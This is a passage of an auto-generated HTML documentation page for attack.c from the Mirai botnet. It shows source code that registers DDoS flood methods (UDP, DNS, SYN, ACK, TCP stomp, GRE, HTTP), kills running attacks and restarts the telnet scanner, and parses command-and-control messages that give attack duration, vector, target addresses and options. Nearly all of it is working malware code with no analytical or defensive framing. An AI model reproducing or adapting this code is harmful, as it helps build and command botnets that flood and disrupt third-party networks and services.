href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#acfffd96bfc135495f6d2dcf0b5c0345c">ATK_VEC_DNS</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#aa6e206675e668d9ef1a931bdac2cb42e">attack_udp_dns</a>);</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a4f522d5241fa0355196c03eaa610c90f">ATK_VEC_UDP_PLAIN</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a02ff8d6a614d729c46bae7cd348e511e">attack_udp_plain</a>);</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#ad80bc552383b0999af6fa38e1718419c">ATK_VEC_SYN</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a5fa5ce92d7cd276d0cf13922eddf1e6d">attack_tcp_syn</a>);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a5d6a088c0ce3645498a4870ccfd09a3c">ATK_VEC_ACK</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a56a3bedfd2e2500ecdaff5edc2bcbc18">attack_tcp_ack</a>);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#ad64add15bdc08f30c42b74a7af54c68b">ATK_VEC_STOMP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#aff68f7c623b860ed728b0343b955e1a4">attack_tcp_stomp</a>);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a3ac5365a0319b66a7a029342542156b6">ATK_VEC_GREIP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#af64bc1071be075031eb42fc6635fd5fa">attack_gre_ip</a>);</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#af036d9269a58359f703ac0b2cece2187">ATK_VEC_GREETH</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#acffffc5cd4b1d6c59581a487a63edc07">attack_gre_eth</a>);</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;    <span class="comment">//add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);</span></div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#a8ced07abb18975692f26b538247550db">ATK_VEC_HTTP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a4b75221461ff0dc40c8199b5c2353a81">attack_app_http</a>);</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;    <span class="keywordflow">return</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;}</div><div class="ttc" id="attack_8h_html_a4b75221461ff0dc40c8199b5c2353a81"><div class="ttname"><a href="attack_8h.html#a4b75221461ff0dc40c8199b5c2353a81">attack_app_http</a></div><div class="ttdeci">void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__app_8c_source.html#l00026">attack_app.c:26</a></div></div>
<div class="ttc" id="attack_8h_html_ad64add15bdc08f30c42b74a7af54c68b"><div class="ttname"><a href="attack_8h.html#ad64add15bdc08f30c42b74a7af54c68b">ATK_VEC_STOMP</a></div><div class="ttdeci">#define ATK_VEC_STOMP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00039">attack.h:39</a></div></div>
<div class="ttc" id="attack_8h_html_afa9c71242ff3032ca0a9b4f8053a9769"><div class="ttname"><a href="attack_8h.html#afa9c71242ff3032ca0a9b4f8053a9769">ATK_VEC_VSE</a></div><div class="ttdeci">#define ATK_VEC_VSE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00035">attack.h:35</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="attack_8h_html_a56a3bedfd2e2500ecdaff5edc2bcbc18"><div class="ttname"><a href="attack_8h.html#a56a3bedfd2e2500ecdaff5edc2bcbc18">attack_tcp_ack</a></div><div class="ttdeci">void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00161">attack_tcp.c:161</a></div></div>
<div class="ttc" id="attack_8c_html_a22dc581aab1aa201c76bf9bbb82affdf"><div class="ttname"><a href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a></div><div class="ttdeci">static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00226">attack.c:226</a></div></div>
<div class="ttc" id="attack_8h_html_a793fdfa64aaad657551cc649e2988a81"><div class="ttname"><a href="attack_8h.html#a793fdfa64aaad657551cc649e2988a81">attack_udp_generic</a></div><div class="ttdeci">void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00025">attack_udp.c:25</a></div></div>
<div class="ttc" id="attack_8h_html_a12573f0d31b49ed03a25a6bee68cd37f"><div class="ttname"><a href="attack_8h.html#a12573f0d31b49ed03a25a6bee68cd37f">attack_udp_vse</a></div><div class="ttdeci">void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00129">attack_udp.c:129</a></div></div>
<div class="ttc" id="attack_8h_html_af036d9269a58359f703ac0b2cece2187"><div class="ttname"><a href="attack_8h.html#af036d9269a58359f703ac0b2cece2187">ATK_VEC_GREETH</a></div><div class="ttdeci">#define ATK_VEC_GREETH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00041">attack.h:41</a></div></div>
<div class="ttc" id="attack_8h_html_acffffc5cd4b1d6c59581a487a63edc07"><div class="ttname"><a href="attack_8h.html#acffffc5cd4b1d6c59581a487a63edc07">attack_gre_eth</a></div><div class="ttdeci">void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__gre_8c_source.html#l00162">attack_gre.c:162</a></div></div>
<div class="ttc" id="attack_8h_html_aff68f7c623b860ed728b0343b955e1a4"><div class="ttname"><a href="attack_8h.html#aff68f7c623b860ed728b0343b955e1a4">attack_tcp_stomp</a></div><div class="ttdeci">void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00293">attack_tcp.c:293</a></div></div>
<div class="ttc" id="attack_8h_html_acfffd96bfc135495f6d2dcf0b5c0345c"><div class="ttname"><a href="attack_8h.html#acfffd96bfc135495f6d2dcf0b5c0345c">ATK_VEC_DNS</a></div><div class="ttdeci">#define ATK_VEC_DNS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00036">attack.h:36</a></div></div>
<div class="ttc" id="attack_8h_html_a5d6a088c0ce3645498a4870ccfd09a3c"><div class="ttname"><a href="attack_8h.html#a5d6a088c0ce3645498a4870ccfd09a3c">ATK_VEC_ACK</a></div><div class="ttdeci">#define ATK_VEC_ACK</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00038">attack.h:38</a></div></div>
<div class="ttc" id="attack_8h_html_a5eb6c3d025947541be2af2b80b9b655a"><div class="ttname"><a href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a></div><div class="ttdeci">void(* ATTACK_FUNC)(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00031">attack.h:31</a></div></div>
<div class="ttc" id="attack_8h_html_ad80bc552383b0999af6fa38e1718419c"><div class="ttname"><a href="attack_8h.html#ad80bc552383b0999af6fa38e1718419c">ATK_VEC_SYN</a></div><div class="ttdeci">#define ATK_VEC_SYN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00037">attack.h:37</a></div></div>
<div class="ttc" id="attack_8h_html_af64bc1071be075031eb42fc6635fd5fa"><div class="ttname"><a href="attack_8h.html#af64bc1071be075031eb42fc6635fd5fa">attack_gre_ip</a></div><div class="ttdeci">void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__gre_8c_source.html#l00020">attack_gre.c:20</a></div></div>
<div class="ttc" id="attack_8h_html_ae0f309784c914a61d84fd3988e3e7321"><div class="ttname"><a href="attack_8h.html#ae0f309784c914a61d84fd3988e3e7321">ATK_VEC_UDP</a></div><div class="ttdeci">#define ATK_VEC_UDP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00034">attack.h:34</a></div></div>
<div class="ttc" id="attack_8h_html_aa6e206675e668d9ef1a931bdac2cb42e"><div class="ttname"><a href="attack_8h.html#aa6e206675e668d9ef1a931bdac2cb42e">attack_udp_dns</a></div><div class="ttdeci">void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00230">attack_udp.c:230</a></div></div>
<div class="ttc" id="attack_8h_html_a4f522d5241fa0355196c03eaa610c90f"><div class="ttname"><a href="attack_8h.html#a4f522d5241fa0355196c03eaa610c90f">ATK_VEC_UDP_PLAIN</a></div><div class="ttdeci">#define ATK_VEC_UDP_PLAIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00043">attack.h:43</a></div></div>
<div class="ttc" id="attack_8h_html_a3ac5365a0319b66a7a029342542156b6"><div class="ttname"><a href="attack_8h.html#a3ac5365a0319b66a7a029342542156b6">ATK_VEC_GREIP</a></div><div class="ttdeci">#define ATK_VEC_GREIP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00040">attack.h:40</a></div></div>
<div class="ttc" id="attack_8h_html_a8ced07abb18975692f26b538247550db"><div class="ttname"><a href="attack_8h.html#a8ced07abb18975692f26b538247550db">ATK_VEC_HTTP</a></div><div class="ttdeci">#define ATK_VEC_HTTP</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00044">attack.h:44</a></div></div>
<div class="ttc" id="attack_8h_html_a02ff8d6a614d729c46bae7cd348e511e"><div class="ttname"><a href="attack_8h.html#a02ff8d6a614d729c46bae7cd348e511e">attack_udp_plain</a></div><div class="ttdeci">void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00375">attack_udp.c:375</a></div></div>
<div class="ttc" id="attack_8h_html_a5fa5ce92d7cd276d0cf13922eddf1e6d"><div class="ttname"><a href="attack_8h.html#a5fa5ce92d7cd276d0cf13922eddf1e6d">attack_tcp_syn</a></div><div class="ttdeci">void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00018">attack_tcp.c:18</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="acf00fa745202d52753ab2b2b9b7b1e09"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_kill_all </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00044">44</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00012">ATTACK_CONCURRENT_MAX</a>, <a class="el" href="attack_8c_source.html#l00020">attack_ongoing</a>, and <a class="el" href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init()</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00047">main()</a>.</p>
<div class="fragment"><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;{</div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;    printf(<span class="stringliteral">&quot;[attack] Killing all ongoing attacks\n&quot;</span>);</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;</div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a>; i++)</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;    {</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;        <span class="keywordflow">if</span> (<a class="code" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a>[i] != 0)</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;            kill(<a class="code" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a>[i], 9);</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;        <a class="code" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a>[i] = 0;</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;    }</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;<span class="preprocessor">#ifdef MIRAI_TELNET</span></div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;    <a class="code" href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init</a>();</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;}</div><div class="ttc" id="scanner_8h_html_aec54f69564fbbbac5032deae9361438a"><div class="ttname"><a href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init</a></div><div class="ttdeci">void scanner_init()</div></div>
<div class="ttc" id="attack_8c_html_a46485849828585ce0cad92273523730c"><div class="ttname"><a href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a></div><div class="ttdeci">int attack_ongoing[ATTACK_CONCURRENT_MAX]</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00020">attack.c:20</a></div></div>
<div class="ttc" id="attack_8h_html_a7c4eacf15bd06764a0834171b5d6789f"><div class="ttname"><a href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a></div><div class="ttdeci">#define ATTACK_CONCURRENT_MAX</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00012">attack.h:12</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a5371fded25466f711e2d1b3c3fdf17c7"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_parse </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>buf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>len</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00064">64</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8c_source.html#l00155">attack_start()</a>, <a class="el" href="ForumPost_8txt_source.html#l00030">free</a>, <a class="el" href="attack_8c_source.html#l00237">free_opts()</a>, <a class="el" href="attack_8h_source.html#l00028">attack_option::key</a>, <a class="el" href="attack_8h_source.html#l00023">attack_target::netmask</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00072">util_memcpy()</a>, <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>, and <a class="el" href="attack_8h_source.html#l00075">attack_method::vector</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00047">main()</a>.</p>
<div class="fragment"><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;{</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;    uint32_t duration;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;    <a class="code" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a> <a class="code" href="structattack__method.html#a6b62edafec0c6cbdda1b25e1c520698e">vector</a>;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;    uint8_t targs_len, opts_len;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__target.html">attack_target</a> *targs = NULL;</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__option.html">attack_option</a> *opts = NULL;</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;    <span class="comment">// Read in attack duration uint32_t</span></div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;    <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint32_t))</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;    duration = ntohl(*((uint32_t *)buf));</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;    buf += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;    len -= <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;    <span class="comment">// Read in attack ID uint8_t</span></div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;    <span class="keywordflow">if</span> (len == 0)</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;    vector = (<a class="code" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>)*buf++;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;    len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;    <span class="comment">// Read in target count uint8_t</span></div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;    <span class="keywordflow">if</span> (len == 0)</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;    targs_len = (uint8_t)*buf++;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;    len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;    <span class="keywordflow">if</span> (targs_len == 0)</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;    <span class="comment">// Read in all targs</span></div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;    <span class="keywordflow">if</span> (len &lt; ((<span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>) + <span class="keyword">sizeof</span> (uint8_t)) * targs_len))</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;    targs = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__target.html">attack_target</a>));</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;    {</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;        targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a> = *((<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a> *)buf);</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;        buf += <span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>);</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;        targs[i].<a class="code" href="structattack__target.html#af38e9712f03de6be723c5acede3f2114">netmask</a> = (uint8_t)*buf++;</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;        len -= (<span class="keyword">sizeof</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a>) + <span class="keyword">sizeof</span> (uint8_t));</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;        targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_family = AF_INET;</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;        targs[i].<a class="code" href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">sock_addr</a>.sin_addr.s_addr = targs[i].<a class="code" href="structattack__target.html#a431d4eed6dd4e7faddf9b8615b4d5c2a">addr</a>;</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;    }</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;</div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;    <span class="comment">// Read in flag count uint8_t</span></div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;    <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint8_t))</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;        <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;    opts_len = (uint8_t)*buf++;</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;    len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;    <span class="comment">// Read in all opts</span></div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;    <span class="keywordflow">if</span> (opts_len &gt; 0)</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;    {</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;        opts = calloc(opts_len, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__option.html">attack_option</a>));</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; opts_len; i++)</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        {</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;            uint8_t val_len;</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;            <span class="comment">// Read in key uint8</span></div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;            <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint8_t))</div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;                <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;            opts[i].<a class="code" href="structattack__option.html#a276df7d1c5fbbf555b8430a39b4015df">key</a> = (uint8_t)*buf++;</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;            len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;            <span class="comment">// Read in data length uint8</span></div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;            <span class="keywordflow">if</span> (len &lt; <span class="keyword">sizeof</span> (uint8_t))</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;                <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;            val_len = (uint8_t)*buf++;</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;            len -= <span class="keyword">sizeof</span> (uint8_t);</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;            <span class="keywordflow">if</span> (len &lt; val_len)</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;                <span class="keywordflow">goto</span> cleanup;</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;            opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a> = calloc(val_len + 1, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;            <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a>, buf, val_len);</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;            buf += val_len;</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;            len -= val_len;</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;        }</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;    }</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;    errno = 0;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;    <a class="code" href="attack_8c.html#a5631e1ae5b2170dabea1d03c816e9885">attack_start</a>(duration, vector, targs_len, targs, opts_len, opts);</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;    <span class="comment">// Cleanup</span></div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;    cleanup:</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;    <span class="keywordflow">if</span> (targs != NULL)</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;        <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(targs);</div><div class="line"><a name="l00151"></a><span 